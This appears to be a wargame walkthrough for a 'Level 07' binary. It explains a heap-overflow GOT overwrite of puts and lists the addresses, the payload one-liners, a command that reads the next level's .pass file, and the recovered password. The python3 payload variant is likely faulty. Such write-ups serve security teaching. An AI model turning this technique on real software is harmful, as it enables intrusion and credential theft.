# Level 07 Walkthrough

## Binary analysis

The binary allocates two structures and two string buffers on the heap. It uses `strcpy` to copy user input into the first buffer, then again into the second buffer, using pointers stored in the structures. The goal is to overflow the first buffer to overwrite the pointer in the second structure, so that the second `strcpy` writes to a controlled location (e.g., the GOT entry for `puts`).

Relevant code:
```
- malloc for struct_1 (0x0804a018)
- malloc for buffer_1 (0x0804a028)
- malloc for struct_2 (0x0804a038)
- malloc for buffer_2 (0x0804a048)

Overflow buffer_1 to overwrite struct_2[1] (pointer at 0x0804a03c).
```

## Exploitation

We overflow buffer_1 (starting at 0x0804a028) with 20 bytes to reach the pointer at 0x0804a03c. We overwrite this pointer with the address of the GOT entry for `puts` (0x08049928). Then, for the second argument, we provide the address of a function to execute (e.g., the address of a shell function or system call).

Example payload:

```bash
./level7 "$(python3 -c 'print("A"*20 + "\x28\x99\x04\x08")')" "$(python3 -c 'print("\xf4\x84\x04\x08")')"
```

- 20 bytes of padding ("A"*20)
- Overwrite pointer with 0x08049928 (GOT entry for puts)
- Second argument: address to write (e.g., 0x080484f4)

## Commands used

```
./level7 "$(printf 'AAAAAAAAAAAAAAAAAAAA\x28\x99\x04\x08')" "$(printf '\xf4\x84\x04\x08')"
cat /home/user/level8/.pass
```

## Result

After running the exploit, we get the password for level8:

```
cat /home/user/level8/.pass
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
```

Copy the password for the next level. 